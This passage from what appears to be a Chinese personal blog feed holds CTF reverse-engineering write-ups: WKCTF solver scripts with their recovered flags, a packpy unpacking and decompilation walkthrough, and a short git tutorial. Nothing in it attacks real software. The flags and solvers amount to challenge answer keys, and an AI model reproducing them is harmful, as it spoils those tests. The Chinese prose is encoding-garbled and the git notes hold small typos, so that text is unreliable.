class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">dec</span><span class="params">(<span class="type">long</span> <span class="type">long</span> input)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> loop = <span class="number">0xff</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> last = input;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> mask = <span class="number">1LL</span> &lt;&lt; <span class="number">63</span>;</span><br><span class="line"><span class="type">int</span> check = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (last &amp; <span class="number">1</span>) &#123;</span><br><span class="line">last ^= <span class="number">0x71234EA7D92996F5</span>;</span><br><span class="line">last = ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)last &gt;&gt; <span class="number">1</span>) | mask;</span><br><span class="line">check++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">last = ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)last &gt;&gt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loop -= <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (loop);</span><br><span class="line"><span class="keyword">return</span> last;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">encode</span><span class="params">(<span class="type">long</span> <span class="type">long</span> input)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> loop = <span class="number">0xff</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> last = input;</span><br><span class="line"><span class="type">int</span> check = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (last &gt;= <span class="number">0</span>)</span><br><span class="line">last &lt;&lt;= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">last = (last &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x71234EA7D92996F5</span>LL;</span><br><span class="line">loop -= <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (loop);</span><br><span class="line"><span class="keyword">return</span> last;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> enc[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x540A95F0C1BA81AE</span>, <span class="number">0xF8844E52E24A0314</span>, <span class="number">0x09FD988F98143EC9</span>, <span class="number">0x3FC00F01B405AD5E</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] = <span class="built_in">dec</span>(enc[i]);</span><br><span class="line">std::cout &lt;&lt; std::hex &lt;&lt; enc[i] &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; (<span class="type">char</span>*)enc &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// WKCTF&#123;2366064af80f669c2cb9519ab&#125;</span></span><br></pre></td></tr></table></figure><h2 id="quite-easy">quite_easy</h2><p>è¿™ä¸ªé¢˜æœ€åè¿è’™å¸¦çŒœå‡ºæ¥äº†QAQ</p><p>å®ƒhookäº†strcmpå‡½æ•°ï¼Œåœ¨é‡Œé¢åšåŠ å¯†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = *(<span class="type">char</span> *)get_byte(j);</span><br><span class="line">  v5 = *(<span class="type">char</span> *)get_byte(j + <span class="number">32</span>) ^ v4;</span><br><span class="line">  v6 = *(_BYTE *)get_byte(j);</span><br><span class="line">  v7 = (_BYTE *)get_byte(j + <span class="number">32</span>);</span><br><span class="line">  sub_4C13E3(~(*v7 &amp; v6) &amp; v5);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( k = <span class="number">16</span>; k &lt; <span class="number">32</span>; ++k )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = *(<span class="type">char</span> *)get_byte(k);</span><br><span class="line">  v9 = *(<span class="type">char</span> *)get_byte(k - <span class="number">16</span>) ^ v8;</span><br><span class="line">  v10 = *(_BYTE *)get_byte(k);</span><br><span class="line">  v11 = (_BYTE *)get_byte(k - <span class="number">16</span>);</span><br><span class="line">  sub_4C13E3(~(*v11 &amp; v10) &amp; v9);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">32</span>; ++m )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = (_BYTE *)get_byte(m);</span><br><span class="line">  *v14 -= *(_BYTE *)(m + a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ å¯†å¤§æ¦‚æœ‰è¿™ä¸‰ä¸ªï¼Œsub_4C13E3ä¸“é—¨ç”¨æ¥æ”¾ç½®å†…å®¹åˆ°output</p><p>å‰é¢å‡ ä¸ªæ‰æ˜¯åŠ å¯†ï¼Œè¿™ä¸ªåŠ å¯†æ–¹å¼å½“æ—¶æ˜¯çŒœçš„ï¼Œæœ‰ç‚¹æŠ½è±¡ï¼Œè°ƒä¸åŠ¨ï¼Œå¤ç°çš„æ—¶å€™éªŒè¯äº†ä¸€ä¸‹å‘ç°ç¡®å®å°±æ˜¯å®ƒå†™çš„é‚£æ ·åŠ å¯†çš„</p><p>ç”±äºè°ƒè¯•æ—¶å¯ä»¥å‘ç°ï¼Œå®ƒæŠŠéšæœºç”Ÿæˆçš„16ä½å€¼æ‹¼åœ¨flagåé¢äº†ï¼Œæ‰€ä»¥å¯ä»¥è°ƒè¯•å¾—åˆ°ç¬¬ä¸€è½®çš„å‚æ•°ï¼Œç¬¬äºŒè½®çš„å‚æ•°å°±æ˜¯flagçš„å€¼ï¼Œç„¶åæœ€åä¸€è½®ç”¨äº†ä¼ å…¥çš„ç¬¬äºŒä¸ªå­—ç¬¦ä¸²ï¼Œå°±æ˜¯é‚£ä¸ªå‡flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">last = [<span class="number">0x80</span>, <span class="number">0xD3</span>, <span class="number">0x6F</span>, <span class="number">0xFF</span>, <span class="number">0x15</span>, <span class="number">0x03</span>, <span class="number">0x98</span>, <span class="number">0x8C</span>, <span class="number">0xB4</span>, <span class="number">0x5B</span>, <span class="number">0x96</span>, <span class="number">0xC0</span>, <span class="number">0x59</span>, <span class="number">0xAC</span>, <span class="number">0x18</span>, <span class="number">0xDF</span>, <span class="number">0x2D</span>, <span class="number">0xCE</span>, <span class="number">0x3F</span>, <span class="number">0xFB</span>, <span class="number">0xC4</span>, <span class="number">0xED</span>, <span class="number">0xD8</span>, <span class="number">0xD2</span>, <span class="number">0xA8</span>, <span class="number">0x2D</span>, <span class="number">0xF8</span>, <span class="number">0x23</span>, <span class="number">0x9F</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0xCE</span>]</span><br><span class="line"></span><br><span class="line">mask = [<span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x31</span>, <span class="number">0x64</span>, <span class="number">0x36</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x65</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x31</span>, <span class="number">0x36</span>, <span class="number">0x61</span>, <span class="number">0x33</span>, <span class="number">0x37</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x66</span>, <span class="number">0x30</span>, <span class="number">0x62</span>, <span class="number">0x37</span>, <span class="number">0x61</span>, <span class="number">0x34</span>, <span class="number">0x30</span>, <span class="number">0x7D</span>]</span><br><span class="line">rand = [<span class="number">0xB1</span>, <span class="number">0x74</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0xD6</span>, <span class="number">0x13</span>, <span class="number">0xCC</span>, <span class="number">0x85</span>, <span class="number">0x20</span>, <span class="number">0xA8</span>, <span class="number">0xF4</span>, <span class="number">0x96</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x7D</span>, <span class="number">0x26</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    last[i]+=mask[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    last[i]^=rand[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>,<span class="number">32</span>):</span><br><span class="line">    last[i]^=last[i-<span class="number">16</span>]</span><br><span class="line">pl(last)</span><br><span class="line"><span class="comment"># WKCTF&#123;08898c40064d1fc4836db94fe&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œåº”å½“å…ˆæ‰§è¡Œç¬¬ä¸€ä¸ªè§£å¯†å†æ‰§è¡Œç¬¬äºŒä¸ªè§£å¯†ï¼Œè¿™æ ·ç¬¬äºŒè½®è§£å¯†æ‰èƒ½ç”¨å½“æ—¶å¼‚æˆ–çš„å€¼</p>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gitåŸºæœ¬æ“ä½œ</title>
      <link href="/posts/ab9e1965.html"/>
      <url>/posts/ab9e1965.html</url>
      
        <content type="html"><![CDATA[<h2 id="Gitå­¦ä¹ ">Gitå­¦ä¹ </h2><p>æ˜“äºè°ƒè¯•ä¼˜åŒ–è¿­ä»£ï¼Œç”¨äºç‰ˆæœ¬ç®¡ç†</p><h3 id="ç‰ˆæœ¬æ§åˆ¶">ç‰ˆæœ¬æ§åˆ¶</h3><p>å†å²è®°å½•ï¼Œè¿˜åŸå†…å®¹</p><h3 id="åŸºæœ¬æ“ä½œ">åŸºæœ¬æ“ä½œ</h3><h4 id="åˆ›å»ºæœ¬åœ°ä»“åº“">åˆ›å»ºæœ¬åœ°ä»“åº“</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir xxx</span><br><span class="line">cd xxx</span><br><span class="line">git init</span><br></pre></td></tr></table></figure><p>é…ç½®ç”¨æˆ·å/é‚®ç®±</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;xxxx&quot;</span><br><span class="line">git config --global user.email &quot;xxx@qq.com&quot;</span><br></pre></td></tr></table></figure><h4 id="æäº¤å†…å®¹">æäº¤å†…å®¹</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git add xxx #å°†æŸä¸ªå†…å®¹æš‚å­˜</span><br><span class="line">git add . #æŠŠæ‰€æœ‰å·²ä¿®æ”¹æ–‡ä»¶ç§»åˆ°æš‚å­˜åŒº</span><br><span class="line">git status #æŸ¥çœ‹å½“å‰çŠ¶æ€</span><br><span class="line">git commit -m &quot;æ³¨é‡Šè¯´æ˜&quot; #æäº¤å·²æš‚å­˜çš„æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶çŠ¶æ€</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å·²ä¿®æ”¹ï¼šå¤„äºå·¥ä½œåŒº</span><br><span class="line">å·²æš‚å­˜ï¼šå¤„äºæš‚å­˜åŒº</span><br><span class="line">å·²æäº¤ï¼šå¤„äºGitä»“åº“</span><br></pre></td></tr></table></figure><p>å…¶å®ƒå‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log #æŸ¥çœ‹æäº¤è®°å½•</span><br></pre></td></tr></table></figure><h2 id="Githubè¿œç¨‹ä»“åº“æ“ä½œ">Githubè¿œç¨‹ä»“åº“æ“ä½œ</h2><p>åˆ›å»ºä»“åº“åï¼Œåœ¨SSHå¤„å¾—åˆ°ä¸€ä¸ªé“¾æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add name_of_remote_repository git@github.com:xxx</span><br></pre></td></tr></table></figure><p>é…ç½®å…¬ç§é’¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;é‚®ç®±&quot;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†å…¬ç§é’¥</p><p>æ²¡æœ‰pubçš„æ˜¯ç§é’¥ï¼Œæœ‰pubçš„æ˜¯ç§é’¥</p><p>åœ¨githubä¸­æ‰¾åˆ°è®¾ç½®SSH and FPG keysï¼Œæ–°å»ºï¼Œç„¶åå†keyä¸­æ·»åŠ pubkeyå†…å®¹ã€‚è¿™æ ·å°±è¿æ¥å¥½äº†</p><p>ç„¶å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>ç”¨äºéªŒè¯æ˜¯å¦å¯ä»¥è¿æ¥ä¸Š</p><p>pushï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u name main #nameæ˜¯è¿œç¨‹ä»“åº“åï¼Œmainæ˜¯åˆ†æ”¯</span><br></pre></td></tr></table></figure><h2 id="åˆ†æ”¯ç®¡ç†">åˆ†æ”¯ç®¡ç†</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch  #æŸ¥çœ‹å½“å‰åˆ†æ”¯</span><br></pre></td></tr></table></figure><p>åˆ†æ”¯åªæ˜¯ä¸€ä¸ªæŒ‡é’ˆ</p><p>è¯¦è§ï¼š</p><p><a href="https://blog.csdn.net/silence_pinot/article/details/111478596">gitçš„åˆ†æ”¯ç®¡ç†ï¼ˆè¯¦ç»†ç‰ˆï¼‰_gitåˆ†æ”¯ç®¡ç†-CSDNåšå®¢</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b new_branch_name  #åˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯å¹¶åˆ‡æ¢åˆ°è¿™ä¸ªåˆ†æ”¯</span><br><span class="line">git breach -d name #åˆ é™¤ä¸€ä¸ªåˆ†æ”¯</span><br><span class="line">git checkout main #åˆ‡æ¢å›mainåˆ†æ”¯</span><br><span class="line">git merge branch_name #å°†ä¸€ä¸ªåˆ†æ”¯ï¼ˆå¿«é€Ÿåˆå¹¶ï¼Œåªç§»åŠ¨æŒ‡é’ˆï¼‰åˆå¹¶åˆ°ä¸»åˆ†æ”¯</span><br></pre></td></tr></table></figure><p>ä¿å­˜å½“å‰å·¥ä½œç°åœºï¼Œç”¨äºä¸´æ—¶åˆ‡æ¢åˆ†æ”¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git stash  #ä¿å­˜</span><br><span class="line">git stash pop  #æ¢å¤</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> å¼€å‘ </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¼€å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æš‘å‡å­¦ä¹ è®°å½•1</title>
      <link href="/posts/4ead32f4.html"/>
      <url>/posts/4ead32f4.html</url>
      
        <content type="html"><![CDATA[<div class="note info simple"><p>ç›®å½•ï¼š</p><p><a href="https://www.pri87.vip/posts/4ead32f4.html">å­¦ä¹ è®°å½•1</a> &lt;=</p><p>å­¦ä¹ è®°å½•2</p></div><p>æƒ³ç ”ç©¶ä¸€ä¸‹åè°ƒè¯•ï¼Œæ‰€ä»¥æœ€è¿‘çš„ä¸»çº¿æ˜¯å½’çº³åè°ƒè¯•æŠ€æœ¯<br>ä¹‹åä¼šå•ç‹¬å†™ä¸€ç¯‡åšå®¢æ¥æ±‡æ€»</p><p>ç„¶åè®°å½•ä¸€ä¸‹æœ€è¿‘å†™çš„é¢˜</p><p>ä»¥åŠåœ¨æ‚æ–¹å‘ä¸Šé¢å­¦çš„ä¸œè¥¿</p><hr><h2 id="wp">wp:</h2><p><a href="https://www.pri87.vip/posts/1cdc16cf.html">2024æ˜¥ç§‹æ¯å¤ re wp</a></p><p><a href="https://www.pri87.vip/posts/4f799b15.html">WKCTF-REéƒ¨åˆ†wp</a></p><h3 id="çŸ©é˜µæ¯packpyé¢˜ç›®å¤ç°ï¼š">çŸ©é˜µæ¯packpyé¢˜ç›®å¤ç°ï¼š</h3><p>æ‹¿åˆ°æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªelfï¼Œç”¨010æ‰“å¼€ï¼Œå‘ç°è¢«upxè¿‡ï¼Œä¿®æ”¹ä¸€ä¸‹æ ‡å¿—ï¼ŒæŠŠupx?æ”¹æˆUPX!ï¼Œç”¨upx -då»å£³</p><p>æ‰“å¼€åï¼Œå‘ç°æ˜¯ä¸€ä¸ªpyinstalleræ‰“åŒ…çš„pyæ–‡ä»¶ï¼Œç”¨å·¥å…·åç¼–è¯‘æˆpyc</p><p>ç„¶åuncompyle6è§£ç ä¸»è¦pycï¼Œå¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.0</span></span><br><span class="line"><span class="comment"># Python bytecode version base 3.8.0 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.9.13 (tags/v3.9.13:6de2ca5, May 17 2022, 16:36:42) [MSC v.1929 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: packpy.py</span></span><br><span class="line"><span class="keyword">import</span> base58, zlib, marshal</span><br><span class="line">scrambled_code_string = <span class="string">b&#x27;X1XehTQeZCsb4WSLBJBYZMjovD1x1E5wjTHh2w3j8dDxbscVa6HLEBSUTPEMsAcerwYASTaXFsCmWb1RxBfwBd6RmyePv3AevTDUiFAvV1GB94eURvtdrpYez7dF1egrwVz3EcQjHxXrpLXs2APE4MS93sMsgMgDrTFCNwTkPba31Aa2FeCSMu151LvEpwiPq5hvaZQPaY2s4pBpH16gGDoVb9MEvLn5J4cP23rEfV7EzNXMgqLUKF82mH1v7yjVCtYQhR8RprKCCtD3bekHjBH2AwES4QythgjVetUNDRpN5gfeJ99UYbZn1oRQHVmiu1sLjpq2mMm8tTuiZgfMfsktf5Suz2w8DgRX4qBKQijnuU4Jou9hduLeudXkZ85oWx9SU7MCE6gjsvy1u57VYw33vckJU6XGGZgZvSqKGR5oQKJf8MPNZi1dF8yF9MkwDdEq59jFsRUJDv7kNwig8XiuBXvmtJPV963thXCFQWQe8XGSu7kJqeRaBX1pkkQ4goJpgTLDHR1LW7bGcZ7m13KzW5mVmJHax81XLis774FjwWpApmTVuiGC2TQr2RcyUTkhGgC8R4bQiXgCsqZMoWyafcSmjdZsHmE6WgNAqPQmEg9FyjpK5f2XC1DkzuyHan5YceeEDMxKUJgJrmNcdGxB7281EyeriyuWNJVH2rVNhio6yoG&#x27;</span></span><br><span class="line"><span class="built_in">exec</span>(marshal.loads(zlib.decompress(base58.b58decode(scrambled_code_string))))</span><br></pre></td></tr></table></figure><p>é€šè¿‡æŠŠexecæ”¹æˆprintï¼Œå¯ä»¥å¾—åˆ°è¿™ä¸ªåºåˆ—åŒ–å†…å®¹æ˜¯ä¸€ä¸ªcode object</p><p>æˆ‘ä»¬éœ€è¦æŠŠå®ƒè¿˜åŸæˆå¯è¯»çš„ä»£ç </p><p>åœ¨ç½‘ä¸Šæœç´¢èµ„æ–™çš„æ—¶å€™ï¼Œå‘ç°ï¼Œpyåœ¨æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆè¢«ç¼–è¯‘æˆPyCodeObject å¯¹è±¡ï¼Œç„¶åè¢«ä¿å­˜åˆ°pycæ–‡ä»¶ä¸­</p><p>å¯ä»¥è¿™æ ·å¯¼å…¥pycæ–‡ä»¶çš„å†…å®¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="string">&quot;ä½ å¥½å•Š&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> importlib.machinery <span class="keyword">import</span> SourcelessFileLoader</span><br><span class="line"> </span><br><span class="line">tools = SourcelessFileLoader(</span><br><span class="line">    <span class="string">&quot;tools&quot;</span>, <span class="string">&quot;__pycache__/tools.cpython-38.pyc&quot;</span></span><br><span class="line">).load_module()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(tools.a)  <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">print</span>(tools.b)  <span class="comment"># ä½ å¥½å•Š</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çŒœæµ‹ï¼Œmarshalååºåˆ—åŒ–çš„å†…å®¹å…¶å®å¯ä»¥å½“æˆpycæ¥çœ‹ï¼Œå°è¯•ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">scrambled_code_string = <span class="string">b&#x27;X1XehTQeZCsb4WSLBJBYZMjovD1x1E5wjTHh2w3j8dDxbscVa6HLEBSUTPEMsAcerwYASTaXFsCmWb1RxBfwBd6RmyePv3AevTDUiFAvV1GB94eURvtdrpYez7dF1egrwVz3EcQjHxXrpLXs2APE4MS93sMsgMgDrTFCNwTkPba31Aa2FeCSMu151LvEpwiPq5hvaZQPaY2s4pBpH16gGDoVb9MEvLn5J4cP23rEfV7EzNXMgqLUKF82mH1v7yjVCtYQhR8RprKCCtD3bekHjBH2AwES4QythgjVetUNDRpN5gfeJ99UYbZn1oRQHVmiu1sLjpq2mMm8tTuiZgfMfsktf5Suz2w8DgRX4qBKQijnuU4Jou9hduLeudXkZ85oWx9SU7MCE6gjsvy1u57VYw33vckJU6XGGZgZvSqKGR5oQKJf8MPNZi1dF8yF9MkwDdEq59jFsRUJDv7kNwig8XiuBXvmtJPV963thXCFQWQe8XGSu7kJqeRaBX1pkkQ4goJpgTLDHR1LW7bGcZ7m13KzW5mVmJHax81XLis774FjwWpApmTVuiGC2TQr2RcyUTkhGgC8R4bQiXgCsqZMoWyafcSmjdZsHmE6WgNAqPQmEg9FyjpK5f2XC1DkzuyHan5YceeEDMxKUJgJrmNcdGxB7281EyeriyuWNJVH2rVNhio6yoG&#x27;</span></span><br><span class="line">a = zlib.decompress(base58.b58decode(scrambled_code_string))</span><br><span class="line"></span><br><span class="line">HEAD = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;550D0D0A000000000000000000000000&#x27;</span>) <span class="comment">#è¡¥å……æ–‡ä»¶å¤´</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.pyc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(HEAD+a)</span><br></pre></td></tr></table></figure><p>è¾“å‡ºåï¼ŒçœŸçš„å¯ä»¥ç›´æ¥åç¼–è¯‘ï¼Œå¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">encdata = <span class="string">b&#x27;\x18\xfa\xadd\xed\xab\xad\x9d\xe5\xc0\xad\xfa\xf9\x0be\xf9\xe5\xade6\xf9\xfd\x88\xf9\x9d\xe5\x9c\xe5\x9de\xc3))\x0f\xff&#x27;</span></span><br><span class="line">hex_output = binascii.hexlify(encdata).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>(<span class="params">seed_value</span>):</span><br><span class="line">    key = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    random.seed(seed_value)</span><br><span class="line">    random.shuffle(key)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    encrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        encrypted.append(key[byte] ^ <span class="number">95</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(encrypted)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;input your flag:&#x27;</span>)</span><br><span class="line">    key = generate_key(<span class="built_in">len</span>(flag))</span><br><span class="line">    data = flag.encode()</span><br><span class="line">    encrypted_data = encrypt(data, key)</span><br><span class="line">    <span class="keyword">if</span> encrypted_data == encdata:</span><br><span 